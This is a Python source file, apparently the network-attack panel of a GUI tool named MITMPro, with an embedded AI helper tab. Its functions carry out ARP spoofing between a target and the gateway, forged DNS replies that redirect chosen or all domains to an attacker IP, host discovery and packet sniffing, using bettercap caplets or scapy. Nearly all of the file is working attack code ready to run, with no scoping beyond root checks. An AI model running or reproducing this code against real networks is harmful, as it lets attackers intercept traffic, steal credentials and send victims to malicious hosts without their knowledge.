"""Network Attack Module — ARP Spoofing + DNS Spoofing via bettercap/scapy.

Provides L2/L3 man-in-the-middle attack capabilities:
  - ARP Spoofing: Redirect traffic between target and gateway
  - DNS Spoofing: Respond to DNS queries with attacker-controlled IPs
  - Network Discovery: Scan the local network for live hosts
  - Packet Sniffing: Capture and display traffic in transit

Uses bettercap as the primary engine with scapy fallback for ARP.
All operations require root/sudo privileges on Linux.
On Windows/macOS, limited functionality is available (no ARP/DNS spoofing).
"""
import os
import sys
import time
import json
import socket
import threading
import subprocess
import shutil
import platform
import re


import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

from mitmpro import common
from mitmpro.ai_components import AIHelperTab

OUTPUT_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

IS_LINUX = platform.system().lower() == "linux"
IS_WINDOWS = platform.system().lower() == "windows"
IS_MACOS = platform.system().lower() == "darwin"

def _is_root():
    """Check if running with root/admin privileges."""
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    else:
        return os.geteuid() == 0

BETTERCAP_BIN = shutil.which("bettercap") or ("/usr/bin/bettercap" if IS_LINUX else None)
ARPING_BIN = shutil.which("arping") or ("/usr/sbin/arping" if IS_LINUX else None)
SCAPY_AVAILABLE = False
try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    pass


def _get_local_ip():
    """Get the local IP address of this machine."""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def _get_gateway():
    """Get the default gateway IP."""
    if IS_LINUX:
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5)
            for line in result.stdout.strip().splitlines():
                parts = line.split()
                if "via" in parts:
                    idx = parts.index("via")
                    if idx + 1 < len(parts):
                        return parts[idx + 1]
        except Exception:
            pass
    elif IS_WINDOWS:
        try:
            result = subprocess.run(
                ["route", "print", "0.0.0.0"],
                capture_output=True, text=True, timeout=5)
            for line in result.stdout.strip().splitlines():
                if "0.0.0.0" in line and "0.0.0.0" == line.split()[0]:
                    parts = line.split()
                    if len(parts) >= 3:
                        return parts[2]
        except Exception:
            pass
    elif IS_MACOS:
        try:
            result = subprocess.run(
                ["route", "-n", "get", "default"],
                capture_output=True, text=True, timeout=5)
            for line in result.stdout.strip().splitlines():
                if "gateway:" in line:
                    return line.split("gateway:")[1].strip()
        except Exception:
            pass
    return "192.168.1.1"


def _get_interface():
    """Get the default network interface."""
    if IS_LINUX:
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5)
            for line in result.stdout.strip().splitlines():
                parts = line.split()
                if "dev" in parts:
                    idx = parts.index("dev")
                    if idx + 1 < len(parts):
                        return parts[idx + 1]
        except Exception:
            pass
    elif IS_WINDOWS:
        try:
            result = subprocess.run(
                ["powershell", "-Command", "Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -ExpandProperty InterfaceAlias"],
                capture_output=True, text=True, timeout=5)
            iface = result.stdout.strip()
            if iface:
                return iface
        except Exception:
            pass
    elif IS_MACOS:
        try:
            result = subprocess.run(
                ["route", "-n", "get", "default"],
                capture_output=True, text=True, timeout=5)
            for line in result.stdout.strip().splitlines():
                if "interface:" in line:
                    return line.split("interface:")[1].strip()
        except Exception:
            pass
    return "eth0" if IS_LINUX else ("Ethernet" if IS_WINDOWS else "en0")


def is_valid_ip_or_cidr(val):
    """Validate an IP address or CIDR range."""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}(/\d{1,2})?$'
    return bool(re.match(pattern, val))

def is_valid_iface(val):
    """Validate a network interface name."""
    pattern = r'^[a-zA-Z0-9\.\-_]+$'
    return bool(re.match(pattern, val))

def is_valid_domain(val):
    """Validate a domain name or allow empty."""
    if not val:
        return True
    pattern = r'^[a-zA-Z0-9\.\-]+$'
    return bool(re.match(pattern, val))

def is_valid_bpf(val):
    """Validate BPF filter syntax."""
    if not val:
        return True
    # Allow alphanumeric and common BPF operators
    pattern = r'^[a-zA-Z0-9\s\(\)\!\&=\|<>:\-\.\/]*$'
    return bool(re.match(pattern, val))


class NetworkAttackPanel(ttk.Notebook):
    """Full-featured network attack panel with ARP spoofing, DNS spoofing,
    network discovery, and packet capture."""

    def __init__(self, master):
        super().__init__(master)

        self.main_frame = ttk.Frame(self)
        self.add(self.main_frame, text="Network Attacks")
        self.add(AIHelperTab(self, "Network Attacks"), text="AI Helper")

        self.main_frame.columnconfigure(0, weight=1)
        self.main_frame.rowconfigure(1, weight=1)

        self._arp_proc = None
        self._dns_proc = None
        self._sniff_proc = None
        self._sniff_stop_flag = False
        self._bettercap_session = None
        self._timer_id = None

        self._build_ui()
        self._refresh_info()

    def _build_ui(self):
        nb = ttk.Notebook(self.main_frame)
        nb.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=4, pady=4)
        self.main_frame.rowconfigure(0, weight=1)

        # ---- Tab 1: ARP Spoofing ----
        arp_frame = ttk.Frame(nb)
        nb.add(arp_frame, text="  ARP Spoof  ")
        arp_frame.columnconfigure(1, weight=1)
        arp_frame.rowconfigure(3, weight=1)

        arp_top = ttk.LabelFrame(arp_frame, text="ARP Spoofing Configuration")
        arp_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        arp_top.columnconfigure(1, weight=1)

        ttk.Label(arp_top, text="Target IP:").grid(row=0, column=0, sticky="w", padx=4)
        self.arp_target = ttk.Entry(arp_top)
        self.arp_target.grid(row=0, column=1, sticky="ew", padx=4, pady=2)
        self.arp_target.insert(0, "192.168.1.100")

        ttk.Label(arp_top, text="Gateway IP:").grid(row=1, column=0, sticky="w", padx=4)
        self.arp_gw = ttk.Entry(arp_top)
        self.arp_gw.grid(row=1, column=1, sticky="ew", padx=4, pady=2)
        self.arp_gw.insert(0, _get_gateway())

        ttk.Label(arp_top, text="Interface:").grid(row=2, column=0, sticky="w", padx=4)
        self.arp_iface = ttk.Entry(arp_top, width=12)
        self.arp_iface.grid(row=2, column=1, sticky="w", padx=4, pady=2)
        self.arp_iface.insert(0, _get_interface())

        arp_btns = ttk.Frame(arp_frame)
        arp_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(arp_btns, text="Start ARP Spoof",
                   command=self.start_arp_spoof).pack(side="left", padx=4)
        ttk.Button(arp_btns, text="Stop",
                   command=self.stop_arp_spoof).pack(side="left", padx=4)
        ttk.Button(arp_btns, text="Restore Targets",
                   command=self.restore_arp).pack(side="left", padx=4)

        self.arp_status = ttk.Label(arp_btns, text="STOPPED", foreground="#f85149")
        self.arp_status.pack(side="left", padx=10)

        arp_opts = ttk.Frame(arp_frame)
        arp_opts.grid(row=2, column=0, sticky="ew", padx=4, pady=2)
        self.arp_full_duplex = tk.BooleanVar(value=True)
        ttk.Checkbutton(arp_opts, text="Full duplex (spoof both directions)",
                        variable=self.arp_full_duplex).pack(side="left", padx=4)
        self.arp_enable_ip_forward = tk.BooleanVar(value=True)
        ttk.Checkbutton(arp_opts, text="Enable IP forwarding",
                        variable=self.arp_enable_ip_forward).pack(side="left", padx=4)

        self.arp_out = scrolledtext.ScrolledText(
            arp_frame, height=10, bg="black", fg="lightgreen",
            font=("Courier", 10), state="disabled")
        self.arp_out.grid(row=3, column=0, sticky="nsew", padx=4, pady=4)

        # ---- Tab 2: DNS Spoofing ----
        dns_frame = ttk.Frame(nb)
        nb.add(dns_frame, text="  DNS Spoof  ")
        dns_frame.columnconfigure(1, weight=1)
        dns_frame.rowconfigure(3, weight=1)

        dns_top = ttk.LabelFrame(dns_frame, text="DNS Spoofing Configuration")
        dns_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        dns_top.columnconfigure(1, weight=1)

        ttk.Label(dns_top, text="Spoof IP (attacker):").grid(
            row=0, column=0, sticky="w", padx=4)
        self.dns_spoof_ip = ttk.Entry(dns_top)
        self.dns_spoof_ip.grid(row=0, column=1, sticky="ew", padx=4, pady=2)
        self.dns_spoof_ip.insert(0, _get_local_ip())

        ttk.Label(dns_top, text="Domain (blank=all):").grid(
            row=1, column=0, sticky="w", padx=4)
        self.dns_domain = ttk.Entry(dns_top)
        self.dns_domain.grid(row=1, column=1, sticky="ew", padx=4, pady=2)
        self.dns_domain.insert(0, "")

        ttk.Label(dns_top, text="Interface:").grid(
            row=2, column=0, sticky="w", padx=4)
        self.dns_iface = ttk.Entry(dns_top, width=12)
        self.dns_iface.grid(row=2, column=1, sticky="w", padx=4, pady=2)
        self.dns_iface.insert(0, _get_interface())

        dns_btns = ttk.Frame(dns_frame)
        dns_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(dns_btns, text="Start DNS Spoof",
                   command=self.start_dns_spoof).pack(side="left", padx=4)
        ttk.Button(dns_btns, text="Stop",
                   command=self.stop_dns_spoof).pack(side="left", padx=4)

        self.dns_status = ttk.Label(dns_btns, text="STOPPED", foreground="#f85149")
        self.dns_status.pack(side="left", padx=10)

        self.dns_out = scrolledtext.ScrolledText(
            dns_frame, height=10, bg="black", fg="lightgreen",
            font=("Courier", 10), state="disabled")
        self.dns_out.grid(row=3, column=0, sticky="nsew", padx=4, pady=4)

        # ---- Tab 3: Network Discovery ----
        scan_frame = ttk.Frame(nb)
        nb.add(scan_frame, text="  Discovery  ")
        scan_frame.columnconfigure(1, weight=1)
        scan_frame.rowconfigure(2, weight=1)

        scan_top = ttk.LabelFrame(scan_frame, text="Network Discovery")
        scan_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        scan_top.columnconfigure(1, weight=1)

        ttk.Label(scan_top, text="Target:").grid(row=0, column=0, sticky="w", padx=4)
        self.scan_target = ttk.Entry(scan_top)
        self.scan_target.grid(row=0, column=1, sticky="ew", padx=4, pady=2)
        self.scan_target.insert(0, "192.168.1.0/24")

        ttk.Label(scan_top, text="Method:").grid(row=1, column=0, sticky="w", padx=4)
        self.scan_method = ttk.Combobox(
            scan_top, values=["arp", "icmp", "tcp", "nmap"], width=10)
        self.scan_method.grid(row=1, column=1, sticky="w", padx=4, pady=2)
        self.scan_method.set("arp")

        scan_btns = ttk.Frame(scan_frame)
        scan_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(scan_btns, text="Scan",
                   command=self.run_scan).pack(side="left", padx=4)
        ttk.Button(scan_btns, text="Clear",
                   command=lambda: self._clear(self.scan_out)).pack(side="left", padx=4)

        self.scan_out = scrolledtext.ScrolledText(
            scan_frame, height=12, bg="black", fg="lightgreen",
            font=("Courier", 10), state="disabled")
        self.scan_out.grid(row=2, column=0, sticky="nsew", padx=4, pady=4)

        # ---- Tab 4: Packet Sniffer ----
        sniff_frame = ttk.Frame(nb)
        nb.add(sniff_frame, text="  Sniffer  ")
        sniff_frame.columnconfigure(1, weight=1)
        sniff_frame.rowconfigure(2, weight=1)

        sniff_top = ttk.LabelFrame(sniff_frame, text="Packet Sniffer")
        sniff_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        sniff_top.columnconfigure(1, weight=1)

        ttk.Label(sniff_top, text="Interface:").grid(row=0, column=0, sticky="w", padx=4)
        self.sniff_iface = ttk.Entry(sniff_top, width=12)
        self.sniff_iface.grid(row=0, column=1, sticky="w", padx=4, pady=2)
        self.sniff_iface.insert(0, _get_interface())

        ttk.Label(sniff_top, text="BPF Filter:").grid(row=1, column=0, sticky="w", padx=4)
        self.sniff_filter = ttk.Entry(sniff_top)
        self.sniff_filter.grid(row=1, column=1, sticky="ew", padx=4, pady=2)
        self.sniff_filter.insert(0, "")

        ttk.Label(sniff_top, text="Count:").grid(row=2, column=0, sticky="w", padx=4)
        self.sniff_count = ttk.Entry(sniff_top, width=8)
        self.sniff_count.grid(row=2, column=1, sticky="w", padx=4, pady=2)
        self.sniff_count.insert(0, "100")

        sniff_btns = ttk.Frame(sniff_frame)
        sniff_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(sniff_btns, text="Start Capture",
                   command=self.start_sniff).pack(side="left", padx=4)
        ttk.Button(sniff_btns, text="Stop",
                   command=self.stop_sniff).pack(side="left", padx=4)
        ttk.Button(sniff_btns, text="Clear",
                   command=lambda: self._clear(self.sniff_out)).pack(side="left", padx=4)

        self.sniff_status = ttk.Label(sniff_btns, text="STOPPED", foreground="#f85149")
        self.sniff_status.pack(side="left", padx=10)

        self.sniff_out = scrolledtext.ScrolledText(
            sniff_frame, height=12, bg="black", fg="lightgreen",
            font=("Courier", 10), state="disabled")
        self.sniff_out.grid(row=2, column=0, sticky="nsew", padx=4, pady=4)

    # ----------------------------------------------------------- helpers
    def _append(self, widget, text):
        try:
            widget.config(state="normal")
            widget.insert("end", text)
            widget.see("end")
            widget.config(state="disabled")
        except Exception:
            pass

    def _clear(self, widget):
        try:
            widget.config(state="normal")
            widget.delete("1.0", "end")
            widget.config(state="disabled")
        except Exception:
            pass

    def _refresh_info(self):
        ip = _get_local_ip()
        gw = _get_gateway()
        iface = _get_interface()
        self._append(self.arp_out,
                     f"[*] Local IP: {ip}\n"
                     f"[*] Gateway: {gw}\n"
                     f"[*] Interface: {iface}\n"
                     f"[*] Bettercap: {BETTERCAP_BIN}\n"
                     f"[*] Scapy available: {SCAPY_AVAILABLE}\n\n")

    # -------------------------------------------------------- IP Forwarding
    def _enable_ip_forward(self, enable=True):
        val = "1" if enable else "0"
        try:
            subprocess.run(
                ["sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                capture_output=True, timeout=5)
        except Exception:
            pass

    # -------------------------------------------------------- ARP Spoofing
    def start_arp_spoof(self, **kwargs):
        if sys.platform != "linux":
            messagebox.showerror("Platform Error",
                                 "ARP spoofing requires Linux with root privileges.\n"
                                 "This feature is not available on Windows/macOS.")
            return
        if os.geteuid() != 0:
            messagebox.showerror("Privilege Error",
                                 "ARP spoofing requires root privileges.\n"
                                 "Please run MITMPro with sudo.")
            return

        if self._arp_proc and self._arp_proc.poll() is None:
            self._append(self.arp_out, "[!] ARP spoof already running.\n")
            return

        target = self.arp_target.get().strip()
        gw = self.arp_gw.get().strip()
        iface = self.arp_iface.get().strip()

        if not target or not is_valid_ip_or_cidr(target):
            messagebox.showerror("Error", "Enter a valid target IP/CIDR.")
            return
        if not gw or not is_valid_ip_or_cidr(gw):
            messagebox.showerror("Error", "Enter a valid gateway IP.")
            return
        if not iface or not is_valid_iface(iface):
            messagebox.showerror("Error", "Enter a valid interface name.")
            return

        if self.arp_enable_ip_forward.get():
            self._enable_ip_forward(True)
            self._append(self.arp_out, "[+] IP forwarding enabled.\n")

        self._append(self.arp_out,
                     f"\n[*] Starting ARP spoof: {target} <-> {gw} on {iface}\n")

        if os.path.isfile(BETTERCAP_BIN):
            self._start_bettercap_arp(target, gw, iface)
        elif SCAPY_AVAILABLE:
            self._start_scapy_arp(target, gw, iface)
        else:
            self._append(self.arp_out,
                         "[!] No ARP spoofing tool available.\n"
                         "    Install bettercap: sudo apt install bettercap\n"
                         "    Or scapy: pip3 install scapy\n")
            return

        self.arp_status.config(text="RUNNING", foreground="#2ea043")

    def _start_bettercap_arp(self, target, gw, iface):
        caplet_content = (
            f"set arp.spoof.targets {target}\n"
            f"set arp.spoof.interface {iface}\n"
            f"arp.spoof on\n"
            f"active\n"
        )
        caplet_path = os.path.join(OUTPUT_DIR, "_arp_spoof.cap")
        try:
            with open(caplet_path, "w") as f:
                f.write(caplet_content)
        except Exception as e:
            self._append(self.arp_out, f"[!] Error writing caplet: {e}\n")
            return

        cmd = [BETTERCAP_BIN, "-iface", iface, "-caplet", caplet_path]
        try:
            self._arp_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                bufsize=1, universal_newlines=True)
            threading.Thread(
                target=self._read_arp_output, daemon=True).start()
        except Exception as e:
            self._append(self.arp_out, f"[!] Failed to start bettercap: {e}\n")

    def _start_scapy_arp(self, target, gw, iface):
        import scapy.all as scapy

        def _spoof_worker():
            try:
                self.after(0, self._append, self.arp_out,
                           "[*] Using scapy ARP spoof (lightweight mode)\n")
                target_mac = scapy.getmacbyip(target)
                gw_mac = scapy.getmacbyip(gw)

                if not target_mac or not gw_mac:
                    self.after(0, self._append, self.arp_out,
                               "[!] Could not resolve MAC addresses.\n"
                               "    Ensure target and gateway are on the same LAN.\n")
                    return

                pkt_to_target = scapy.ARP(
                    op=2, pdst=target, hwdst=target_mac, psrc=gw)
                pkt_to_gw = scapy.ARP(
                    op=2, pdst=gw, hwdst=gw_mac, psrc=target)

                self.after(0, self._append, self.arp_out,
                           f"[*] Target MAC: {target_mac}\n"
                           f"[*] Gateway MAC: {gw_mac}\n"
                           f"[*] Sending spoofed ARP replies...\n")

                sent = 0
                while self._arp_proc and self._arp_proc.poll() is None:
                    scapy.send(pkt_to_target, verbose=0)
                    if self.arp_full_duplex.get():
                        scapy.send(pkt_to_gw, verbose=0)
                    sent += 1
                    if sent % 10 == 0:
                        self.after(0, self._append, self.arp_out,
                                   f"[*] Sent {sent} ARP replies\n")
                    time.sleep(2)
            except Exception as e:
                self.after(0, self._append, self.arp_out, f"[!] Scapy error: {e}\n")

        class _Sentinel:
            def __init__(self):
                self.returncode = None
                self._running = True
            def poll(self):
                return None if self._running else 0
            def kill(self):
                self._running = False

        self._arp_proc = _Sentinel()
        threading.Thread(target=_spoof_worker, daemon=True).start()

    def _read_arp_output(self):
        try:
            for line in self._arp_proc.stdout:
                try:
                    self.after(0, self._append, self.arp_out, line)
                except RuntimeError:
                    break
        except Exception:
            pass
        try:
            self.after(0, self._append, self.arp_out,
                       "\n[*] ARP spoof process ended.\n")
            self.after(0, lambda: self.arp_status.config(
                text="STOPPED", foreground="#f85149"))
        except RuntimeError:
            pass

    def stop_arp_spoof(self, **kwargs):
        if self._arp_proc:
            try:
                self._arp_proc.kill()
            except Exception:
                pass
            self._arp_proc = None
        self.arp_status.config(text="STOPPED", foreground="#f85149")
        self._append(self.arp_out, "[*] ARP spoof stopped.\n")

    def restore_arp(self, **kwargs):
        self.stop_arp_spoof()
        gw = self.arp_gw.get().strip()
        target = self.arp_target.get().strip()
        iface = self.arp_iface.get().strip()

        if BETTERCAP_BIN and os.path.isfile(BETTERCAP_BIN):
            caplet_content = (
                f"set arp.spoof.targets {target}\n"
                f"arp.spoof off\n"
                f"quit\n"
            )
            caplet_path = os.path.join(OUTPUT_DIR, "_arp_restore.cap")
            try:
                with open(caplet_path, "w") as f:
                    f.write(caplet_content)
                subprocess.run(
                    [BETTERCAP_BIN, "-iface", iface, "-caplet", caplet_path],
                    capture_output=True, timeout=10)
            except Exception:
                pass
        elif SCAPY_AVAILABLE:
            try:
                import scapy.all as scapy
                gw_mac = scapy.getmacbyip(gw)
                target_mac = scapy.getmacbyip(target)
                if gw_mac and target_mac:
                    for _ in range(5):
                        scapy.send(scapy.ARP(
                            op=2, pdst=gw, hwdst="ff:ff:ff:ff:ff:ff",
                            psrc=target), verbose=0)
                        scapy.send(scapy.ARP(
                            op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff",
                            psrc=gw), verbose=0)
                        time.sleep(0.5)
            except Exception:
                pass

        self._enable_ip_forward(False)
        self._append(self.arp_out,
                     "[+] ARP tables restored. IP forwarding disabled.\n")

    # -------------------------------------------------------- DNS Spoofing
    def start_dns_spoof(self, **kwargs):
        if sys.platform != "linux":
            messagebox.showerror("Platform Error",
                                 "DNS spoofing requires Linux with root privileges.\n"
                                 "This feature is not available on Windows/macOS.")
            return
        if os.geteuid() != 0:
            messagebox.showerror("Privilege Error",
                                 "DNS spoofing requires root privileges.\n"
                                 "Please run MITMPro with sudo.")
            return
        if self._dns_proc and self._dns_proc.poll() is None:
            self._append(self.dns_out, "[!] DNS spoof already running.\n")
            return

        spoof_ip = self.dns_spoof_ip.get().strip()
        domain = self.dns_domain.get().strip()
        iface = self.dns_iface.get().strip()

        if not spoof_ip or not is_valid_ip_or_cidr(spoof_ip):
            messagebox.showerror("Error", "Enter a valid attacker IP to spoof.")
            return
        if not is_valid_domain(domain):
            messagebox.showerror("Error", "Invalid domain format.")
            return
        if not iface or not is_valid_iface(iface):
            messagebox.showerror("Error", "Enter a valid interface name.")
            return

        self._append(self.dns_out,
                     f"\n[*] Starting DNS spoof: replies -> {spoof_ip}\n"
                     f"[*] Domain filter: {'ALL' if not domain else domain}\n")

        if os.path.isfile(BETTERCAP_BIN):
            self._start_bettercap_dns(spoof_ip, domain, iface)
        elif SCAPY_AVAILABLE:
            self._start_scapy_dns(spoof_ip, domain, iface)
        else:
            self._append(self.dns_out,
                         "[!] No DNS spoofing tool available.\n"
                         "    Install bettercap: sudo apt install bettercap\n"
                         "    Or scapy: pip3 install scapy\n")
            return

        self.dns_status.config(text="RUNNING", foreground="#2ea043")

    def _start_bettercap_dns(self, spoof_ip, domain, iface):
        caplet_content = (
            f"set dns.spoof.address {spoof_ip}\n"
            f"set dns.spoof.interface {iface}\n"
        )
        if domain:
            caplet_content += f"dns.spoof on {domain}\n"
        else:
            caplet_content += "dns.spoof on\n"
        caplet_content += "active\n"

        caplet_path = os.path.join(OUTPUT_DIR, "_dns_spoof.cap")
        try:
            with open(caplet_path, "w") as f:
                f.write(caplet_content)
        except Exception as e:
            self._append(self.dns_out, f"[!] Error writing caplet: {e}\n")
            return

        cmd = [BETTERCAP_BIN, "-iface", iface, "-caplet", caplet_path]
        try:
            self._dns_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                bufsize=1, universal_newlines=True)
            threading.Thread(
                target=self._read_dns_output, daemon=True).start()
        except Exception as e:
            self._append(self.dns_out, f"[!] Failed to start bettercap: {e}\n")

    def _start_scapy_dns(self, spoof_ip, domain, iface):
        import scapy.all as scapy

        def _dns_worker():
            try:
                self.after(0, self._append, self.dns_out,
                           "[*] Using scapy DNS spoof (passive mode)\n")
                self.after(0, self._append, self.dns_out,
                           "[*] Listening for DNS queries...\n")

                def handle_dns(pkt):
                    if not self._dns_proc or self._dns_proc.poll() is not None:
                        return
                    if pkt.haslayer(scapy.DNSQR):
                        qname = pkt[scapy.DNSQR].qname.decode(
                            "utf-8", errors="replace").rstrip(".")
                        if not domain or domain in qname:
                            self.after(0, self._append, self.dns_out,
                                       f"  [spoof] {qname} -> {spoof_ip}\n")
                            spoofed = scapy.IP(dst=pkt[scapy.IP].src) / \
                                scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53) / \
                                scapy.DNS(
                                    id=pkt[scapy.DNS].id, qr=1, aa=1,
                                    qd=pkt[scapy.DNS].qd,
                                    an=scapy.DNSRR(
                                        rrname=pkt[scapy.DNSQR].qname,
                                        rdata=spoof_ip))
                            scapy.send(spoofed, verbose=0)

                sniff_filter = "udp port 53"
                scapy.sniff(
                    filter=sniff_filter, prn=handle_dns,
                    stop_filter=lambda p: (
                        self._dns_proc is None
                        or (hasattr(self._dns_proc, "poll")
                            and self._dns_proc.poll() is not None)),
                    iface=iface, store=0)
            except Exception as e:
                self.after(0, self._append, self.dns_out, f"[!] Scapy DNS error: {e}\n")

        class _Sentinel:
            def __init__(self):
                self.returncode = None
                self._running = True
            def poll(self):
                return None if self._running else 0
            def kill(self):
                self._running = False

        self._dns_proc = _Sentinel()
        threading.Thread(target=_dns_worker, daemon=True).start()

    def _read_dns_output(self):
        try:
            for line in self._dns_proc.stdout:
                try:
                    self.after(0, self._append, self.dns_out, line)
                except RuntimeError:
                    break
        except Exception:
            pass
        try:
            self.after(0, self._append, self.dns_out,
                       "\n[*] DNS spoof process ended.\n")
            self.after(0, lambda: self.dns_status.config(
                text="STOPPED", foreground="#f85149"))
        except RuntimeError:
            pass

    def stop_dns_spoof(self, **kwargs):
        if self._dns_proc:
            try:
                self._dns_proc.kill()
            except Exception:
                pass
            self._dns_proc = None
        self.dns_status.config(text="STOPPED", foreground="#f85149")
        self._append(self.dns_out, "[*] DNS spoof stopped.\n")

    # -------------------------------------------------------- Network Scan
    def run_scan(self, **kwargs):
        target = self.scan_target.get().strip()
        method = self.scan_method.get().strip()

        if not target or not is_valid_ip_or_cidr(target):
            messagebox.showerror("Error", "Enter a valid target range.")
            return

        if method in ("arp", "icmp") and IS_LINUX and not _is_root():
            messagebox.showwarning(
                "Privileges Required",
                f"{method.upper()} scan requires root privileges (sudo).\n"
                "Please restart the application with sudo.",
                parent=self)
            return

        self._append(self.scan_out,
                     f"\n[*] Starting {method.upper()} scan on {target}\n"
                     + "-" * 50 + "\n")

        if method == "nmap" and shutil.which("nmap"):
            cmd = ["nmap", "-sn", target]
        elif method == "arp" and SCAPY_AVAILABLE:
            self._scapy_arp_scan(target)
            return
        elif method == "icmp" and SCAPY_AVAILABLE:
            self._scapy_icmp_scan(target)
            return
        elif method == "tcp":
            if shutil.which("nmap"):
                cmd = ["nmap", "-sT", "-p", "80,443,22,21,25,53,8080", target]
            else:
                self._append(self.scan_out,
                             "[!] nmap not found. Install: sudo apt install nmap\n")
                return
        else:
            self._append(self.scan_out,
                         f"[!] Method '{method}' not available. "
                         "Try 'nmap' or install scapy.\n")
            return

        threading.Thread(
            target=self._run_scan_cmd, args=(cmd,), daemon=True).start()

    def _run_scan_cmd(self, cmd):
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                bufsize=1, universal_newlines=True)
            for line in proc.stdout:
                try:
                    self.after(0, self._append, self.scan_out, line)
                except RuntimeError:
                    break
            proc.wait()
            self.after(0, self._append, self.scan_out,
                       f"\n[*] Scan complete (exit code {proc.returncode})\n")
        except Exception as e:
            self.after(0, self._append, self.scan_out, f"\n[!] Error: {e}\n")

    def _scapy_arp_scan(self, target):
        import scapy.all as scapy

        def _worker():
            try:
                answered, _ = scapy.srp(
                    scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
                    scapy.ARP(pdst=target),
                    timeout=3, verbose=0)
                self.after(0, self._append, self.scan_out,
                           f"\n[*] ARP scan results for {target}:\n"
                           + "-" * 50 + "\n")
                for snd, rcv in answered:
                    self.after(0, self._append, self.scan_out,
                               f"  {rcv.psrc:16s}  {rcv.hwsrc}\n")
                self.after(0, self._append, self.scan_out,
                           f"\n[*] {len(answered)} hosts found.\n")
            except Exception as e:
                self.after(0, self._append, self.scan_out, f"\n[!] ARP scan error: {e}\n")
        threading.Thread(target=_worker, daemon=True).start()

    def _scapy_icmp_scan(self, target):
        import scapy.all as scapy

        def _worker():
            try:
                ans, _ = scapy.sr(
                    scapy.IP(dst=target) / scapy.ICMP(),
                    timeout=3, verbose=0)
                self.after(0, self._append, self.scan_out,
                           f"\n[*] ICMP scan results for {target}:\n"
                           + "-" * 50 + "\n")
                for snd, rcv in ans:
                    self.after(0, self._append, self.scan_out,
                               f"  {rcv.src:16s}  alive (TTL={rcv.ttl})\n")
                self.after(0, self._append, self.scan_out,
                           f"\n[*] {len(ans)} hosts responded.\n")
            except Exception as e:
                self.after(0, self._append, self.scan_out, f"\n[!] ICMP scan error: {e}\n")
        threading.Thread(target=_worker, daemon=True).start()

    # -------------------------------------------------------- Packet Sniffer
    def start_sniff(self, **kwargs):
        if self._sniff_proc:
            self._append(self.sniff_out, "[!] Sniffer already running.\n")
            return

        if IS_LINUX and not _is_root():
            messagebox.showwarning(
                "Privileges Required",
                "Packet sniffing requires root privileges (sudo).\n"
                "Please restart the application with sudo.",
                parent=self)
            return

        iface = self.sniff_iface.get().strip()
        bpf = self.sniff_filter.get().strip()
        count_str = self.sniff_count.get().strip()

        if not iface or not is_valid_iface(iface):
            messagebox.showerror("Error", "Enter a valid interface name.")
            return
        if bpf and not is_valid_bpf(bpf):
            messagebox.showerror("Error", "Invalid BPF filter syntax.")
            return
        
        try:
            count = int(count_str) if count_str else 100
            if count <= 0:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Enter a positive integer for count.")
            return

        self.sniff_status.config(text="RUNNING", foreground="#2ea043")
        self._append(self.sniff_out,
                     f"\n[*] Sniffing on {iface} (count={count})\n")

        if SCAPY_AVAILABLE:
            self._sniff_stop_flag = False
            self._scapy_sniff(iface, bpf, count)
        else:
            self._append(self.sniff_out,
                         "[!] Scapy not available. Install: pip3 install scapy\n")
            self.sniff_status.config(text="STOPPED", foreground="#f85149")

    def _scapy_sniff(self, iface, bpf, count):
        import scapy.all as scapy

        def _worker():
            try:
                def process_packet(pkt):
                    summary = pkt.summary()
                    try:
                        self.after(0, self._append, self.sniff_out,
                                   f"  {summary}\n")
                    except RuntimeError:
                        pass

                def stop_filter(pkt):
                    return self._sniff_stop_flag

                scapy.sniff(
                    iface=iface, filter=bpf if bpf else None,
                    prn=process_packet, stop_filter=stop_filter,
                    count=count, store=0)
                self._sniff_proc = None
                self.after(0, self._append, self.sniff_out,
                           f"\n[*] Capture complete ({count} packets)\n")
                self.after(0, lambda: self.sniff_status.config(
                    text="STOPPED", foreground="#f85149"))
            except Exception as e:
                self._sniff_proc = None
                self.after(0, self._append, self.sniff_out,
                           f"\n[!] Sniff error: {e}\n")
                self.after(0, lambda: self.sniff_status.config(
                    text="STOPPED", foreground="#f85149"))

        self._sniff_proc = True
        threading.Thread(target=_worker, daemon=True).start()

    def stop_sniff(self, **kwargs):
        if self._sniff_proc:
            self._sniff_stop_flag = True
            self._sniff_proc = None
        self.sniff_status.config(text="STOPPED", foreground="#f85149")
        self._append(self.sniff_out, "[*] Sniffer stopped.\n")

    # -------------------------------------------------------- cleanup
    def destroy(self):
        self.stop_arp_spoof()
        self.stop_dns_spoof()
        self.stop_sniff()
